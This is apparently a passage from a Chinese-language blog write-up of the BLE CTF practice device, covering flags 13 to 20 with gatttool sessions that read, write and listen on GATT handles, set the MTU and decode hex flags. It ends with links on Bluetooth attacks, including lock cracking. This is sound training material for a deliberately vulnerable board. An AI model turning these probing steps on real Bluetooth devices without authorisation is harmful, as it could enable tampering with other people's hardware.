class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <br>^C⏎                                                                                  tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon [SIGINT]&gt; <br>echo <span class="hljs-string">&quot;63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33&quot;</span>|xxd -ps -r<br>c7b86dd121848c77c113⏎                                                                tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo <span class="hljs-string">&quot;c7b86dd121848c77c113&quot;</span>|xxd -ps<br><span class="hljs-number">63376238366464313231383438633737633131330</span>a<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">6337623836646431323138343863373763313133</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><h3 id="第十三题-flag13"><a href="#第十三题-flag13" class="headerlink" title="第十三题 flag13"></a>第十三题 flag13</h3><p>Check out handle 0x0046 and do what it says. Keep in mind that this notification clallange requires you to recieve multiple responses in order to complete.<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725231653389.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725231916250.png"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tap">tigerortiger@ubuntu ~/s/pthon [1]&gt; <br>gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x0046 -n 0a --listen<br>Characteristic value was written successfully<br>Notification handle = 0x0046 value:<span class="hljs-number"> 55 </span>20 6e 6f<span class="hljs-number"> 20 </span>77<span class="hljs-number"> 61 </span>6e<span class="hljs-number"> 74 </span>20<span class="hljs-number"> 74 </span>68<span class="hljs-number"> 69 </span>73<span class="hljs-number"> 20 </span>6d<span class="hljs-number"> 73 </span>67<span class="hljs-number"> 00 </span>00 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>Notification handle = 0x0046 value:<span class="hljs-number"> 63 </span>39<span class="hljs-number"> 34 </span>35<span class="hljs-number"> 37 </span>64<span class="hljs-number"> 65 </span>35<span class="hljs-number"> 66 </span>64<span class="hljs-number"> 38 </span>63<span class="hljs-number"> 61 </span>66<span class="hljs-number"> 65 </span>33<span class="hljs-number"> 34 </span>39<span class="hljs-number"> 66 </span>64 <br>^C⏎                                                                                  <br>tigerortiger@ubuntu ~/s/pthon [SIGINT]&gt; <br>echo &quot;63<span class="hljs-number"> 39 </span>34<span class="hljs-number"> 35 </span>37<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 35 </span>66<span class="hljs-number"> 64 </span>38<span class="hljs-number"> 63 </span>61<span class="hljs-number"> 66 </span>65<span class="hljs-number"> 33 </span>34<span class="hljs-number"> 39 </span>66 64&quot;|xxd -ps -r<br>c9457de5fd8cafe349fd⏎                                                                tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;c9457de5fd8cafe349fd&quot;|xxd -ps<br>63393435376465356664386361666533343966640a<br><br>tigerortiger@ubuntu ~/s/pthon [1]&gt; <br>gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n 6339343537646535666438636166653334396664<br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~/s/pthon&gt; <br>gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;<br>Score:1 /20<br><br></code></pre></td></tr></table></figure><h3 id="第十四题-flag14"><a href="#第十四题-flag14" class="headerlink" title="第十四题 flag14"></a>第十四题 flag14</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725232424448.png"></p><p>跟十三题一样。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725232520987.png"></p><h3 id="第十五题-flag15"><a href="#第十五题-flag15" class="headerlink" title="第十五题 flag15"></a>第十五题 flag15</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230725232842263.png"><br>要修改CSR 的MAC 地址为上述地址，要使用bdaddr ，但是没办法使用。后面再说。</p><h3 id="第十六题-flag16"><a href="#第十六题-flag16" class="headerlink" title="第十六题 flag16"></a>第十六题 flag16</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726220429673.png"><br>设置MTU 为444<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726220732048.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 -I<br>[C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2][LE]&gt; <span class="hljs-keyword">connect</span><br>Attempting to <span class="hljs-keyword">connect</span> to C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2<br>Connection successful<br>[C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2][LE]&gt; mtu <span class="hljs-number">444</span><br>MTU was exchanged successfully: <span class="hljs-number">444</span><br>[C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2][LE]&gt; char-<br>char-desc       char-<span class="hljs-keyword">read</span>-hnd   char-<span class="hljs-keyword">read</span>-uuid  char-<span class="hljs-keyword">write</span>-cmd  char-<span class="hljs-keyword">write</span>-re<span class="hljs-string">q</span><br><span class="hljs-string">[C8:F0:9E:A6:C8:D2]</span>[LE]&gt; char-<span class="hljs-keyword">read</span>-hnd <span class="hljs-number">0x004e</span><br>Characteristic value/descriptor: <span class="hljs-number">62</span> <span class="hljs-number">31</span> <span class="hljs-number">65</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">39</span> <span class="hljs-number">65</span> <span class="hljs-number">35</span> <span class="hljs-number">61</span> <span class="hljs-number">34</span> <span class="hljs-number">65</span> <span class="hljs-number">61</span> <span class="hljs-number">66</span> <span class="hljs-number">39</span> <span class="hljs-number">66</span> <span class="hljs-number">65</span> <span class="hljs-number">35</span> <span class="hljs-number">31</span> <span class="hljs-number">35</span> <span class="hljs-number">38</span> <br>[C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2][LE]&gt; <span class="hljs-keyword">exit</span><br><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>echo <span class="hljs-string">&quot;Characteristic value/descriptor: 62 31 65 34 30 39 65 35 61 34 65 61 66 39 66 65 35 31 35 38&quot;</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>b1e409e5a4eaf9fe5158<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo -n <span class="hljs-string">&quot;b1e409e5a4eaf9fe5158&quot;</span>|xxd -ps <br><span class="hljs-number">6231653430396535613465616639666535313538</span><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">6231653430396535613465616639666535313538</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="第十七题-flag17"><a href="#第十七题-flag17" class="headerlink" title="第十七题 flag17"></a>第十七题 flag17</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726222620497.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726223325901.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; echo -n <span class="hljs-string">&quot;hello&quot;</span>| xxd -ps<br><span class="hljs-attribute">68656c6c6f</span><br><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; <br><span class="hljs-attribute">gatttool</span> -b C8:F0:<span class="hljs-number">9</span>E:A6:C8:D2 --char-write-req -a <span class="hljs-number">0</span>x0050 -n <span class="hljs-number">68656</span>c6c6f<br><span class="hljs-attribute">Characteristic</span> value was written successfully<br><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; gatttool -b C8:F0:<span class="hljs-number">9</span>E:A6:C8:D2 --char-read -a <span class="hljs-number">0</span>x0050<br><span class="hljs-attribute">Characteristic</span> value/descriptor: <span class="hljs-number">64</span> <span class="hljs-number">34</span> <span class="hljs-number">31</span> <span class="hljs-number">64</span> <span class="hljs-number">38</span> <span class="hljs-number">63</span> <span class="hljs-number">64</span> <span class="hljs-number">39</span> <span class="hljs-number">38</span> <span class="hljs-number">66</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">62</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">34</span> <span class="hljs-number">65</span> <span class="hljs-number">39</span> <span class="hljs-number">38</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; <br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;Characteristic value/descriptor: 64 34 31 64 38 63 64 39 38 66 30 30 62 32 30 34 65 39 38 30 00&quot;</span>|awk -F&#x27;:&#x27; &#x27;&#123;print $<span class="hljs-number">2</span>&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;<br><span class="hljs-attribute">d41d8cd98f00b204e980</span><br><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; echo <span class="hljs-string">&quot;d41d8cd98f00b204e980&quot;</span> | xxd -ps<br><span class="hljs-attribute">64343164386364393866303062323034653938300a</span><br><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; <br><span class="hljs-attribute">gatttool</span> -b C8:F0:<span class="hljs-number">9</span>E:A6:C8:D2 --char-write-req -a <span class="hljs-number">0</span>x002c -n <span class="hljs-number">6434316438636439386630306232303465393830</span><br><span class="hljs-attribute">Characteristic</span> value was written successfully<br><span class="hljs-attribute">tigerortiger</span>@ubuntu ~/s/pthon&gt; <br><span class="hljs-attribute">gatttool</span> -b C8:F0:<span class="hljs-number">9</span>E:A6:C8:D2 --char-read -a <span class="hljs-number">0</span>x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $<span class="hljs-number">2</span>&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;<br><span class="hljs-attribute">Score</span>:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="第十八题-flag18"><a href="#第十八题-flag18" class="headerlink" title="第十八题 flag18"></a>第十八题 flag18</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726223958174.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726223949537.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl">gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0052</span> -n 0a --<span class="hljs-keyword">listen</span><br>Characteristic value was written successfully<br>Notification handle = <span class="hljs-number">0x0052</span> value: <span class="hljs-number">66</span> <span class="hljs-number">63</span> <span class="hljs-number">39</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">63</span> <span class="hljs-number">36</span> <span class="hljs-number">38</span> <span class="hljs-number">62</span> <span class="hljs-number">36</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">36</span> <span class="hljs-number">31</span> <span class="hljs-number">36</span> <span class="hljs-number">39</span> <span class="hljs-number">34</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">62</span> <br>^C⏎                                                                                  <br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon [SIGINT]&gt; <br>echo <span class="hljs-string">&quot;66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot;</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>echo <span class="hljs-string">&quot;aa:66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot;</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>fc920c68b6006169477b<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo -n <span class="hljs-string">&quot;fc920c68b6006169477b&quot;</span>|xxd -ps<br><span class="hljs-number">6663393230633638623630303631363934373762</span><br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">6663393230633638623630303631363934373762</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="第十九题-flag19"><a href="#第十九题-flag19" class="headerlink" title="第十九题 flag19"></a>第十九题 flag19</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726225344083.png"></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726225410917.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl">tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0054</span> -n <span class="hljs-number">00</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x0054</span><br>Characteristic value/descriptor: <span class="hljs-number">66</span> <span class="hljs-number">62</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">38</span> <span class="hljs-number">66</span> <br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x0054</span> -n 0a --<span class="hljs-keyword">listen</span><br>Characteristic value was written successfully<br>Notification handle = <span class="hljs-number">0x0054</span> value: <span class="hljs-number">30</span> <span class="hljs-number">37</span> <span class="hljs-number">65</span> <span class="hljs-number">34</span> <span class="hljs-number">61</span> <span class="hljs-number">30</span> <span class="hljs-number">63</span> <span class="hljs-number">63</span> <span class="hljs-number">34</span> <span class="hljs-number">38</span> <br>^C⏎                                                                                  tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon [SIGINT]&gt; <br>echo <span class="hljs-string">&quot;aa:66 62 62 39 36 36 39 35 38 66 30 37 65 34 61 30 63 63 34 38&quot;</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>fbb966958f07e4a0cc48<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; echo <span class="hljs-string">&quot;fbb966958f07e4a0cc48&quot;</span>|xxd -ps<br><span class="hljs-number">66626239363639353866303765346130636334380</span>a<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon [<span class="hljs-number">1</span>]&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">write</span>-req -a <span class="hljs-number">0x002c</span> -n <span class="hljs-number">6662623936363935386630376534613063633438</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~<span class="hljs-regexp">/s/p</span>thon&gt; <br>gatttool -b C8:F<span class="hljs-number">0</span>:<span class="hljs-number">9</span>E:A6:C8:D2 --char-<span class="hljs-keyword">read</span> -a <span class="hljs-number">0x002a</span>|awk -F<span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>|<span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>|xxd -r -p;<span class="hljs-keyword">printf</span> <span class="hljs-string">&#x27;\n&#x27;</span><br>Score:<span class="hljs-number">1</span> /<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="第二十题-flag20"><a href="#第二十题-flag20" class="headerlink" title="第二十题  flag20"></a>第二十题  flag20</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230726225913551.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c">tigerortiger@ubuntu <span class="hljs-symbol">~/s/pthon&gt; </span><br><span class="hljs-symbol">gatttool -b C8</span>:F0:<span class="hljs-number">9</span>E:A6:C8:D2 --char-read -a <span class="hljs-number">0</span>x0056<span class="hljs-string">|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br>md5 of author&#x27;s twitter handle<br>tigerortiger@ubuntu ~/s/pthon&gt; echo &quot;@hackgnar&quot; -n | md5sum<br>0e8fe5a24d<span class="hljs-number">807605</span>f3ac6c13f<span class="hljs-number">4517</span>2a0  -<br>tigerortiger@ubuntu ~/s/pthon&gt; echo -n &quot;d953bfb<span class="hljs-number">9846</span>acc2e15ee&quot;|xxd -ps<br><span class="hljs-number">64393533626662</span><span class="hljs-number">39383436616363</span><span class="hljs-number">326531356565</span><br>tigerortiger@ubuntu ~/s/pthon&gt; <br>gatttool -b C8:F0:9E:A6:C8:D2 --char-write-req -a 0x002c -n <span class="hljs-number">64393533626662</span><span class="hljs-number">39383436616363</span><span class="hljs-number">326531356565</span><br>Characteristic value was written successfully<br>tigerortiger@ubuntu ~/s/pthon&gt; <br>gatttool -b C8:F0:9E:A6:C8:D2 --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $<span class="hljs-number">2</span>&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;<br>Score:1 /20<br><br></code></pre></td></tr></table></figure><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/hackgnar/ble_ctf">https://github.com/hackgnar/ble_ctf</a></p><p><a href="https://yichen115.github.io/2022/02/14/omybby/">https://yichen115.github.io/2022/02/14/omybby/</a></p><p><a href="https://blog.tclaverie.eu/posts/bluetooth-low-energy-ctf---write-up/">https://blog.tclaverie.eu/posts/bluetooth-low-energy-ctf---write-up/</a></p><p><a href="https://socketo.hatenablog.jp/entry/2019/02/21/203347">https://socketo.hatenablog.jp/entry/2019/02/21/203347</a></p><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p>蓝牙安全与攻击案例分析</p><p><a href="https://evilpan.com/2021/07/10/bluetooth-sec/">https://evilpan.com/2021/07/10/bluetooth-sec/</a></p><p><a href="https://www.getit01.com/p2018101545717775/">https://www.getit01.com/p2018101545717775/</a></p><p>如何破解一个蓝牙锁</p><p><a href="https://yaseng.org/how-to-crack-a-ble-lock.html">https://yaseng.org/how-to-crack-a-ble-lock.html</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-10109.html">http://drops.xmd5.com/static/drops/tips-10109.html</a></p><p><a 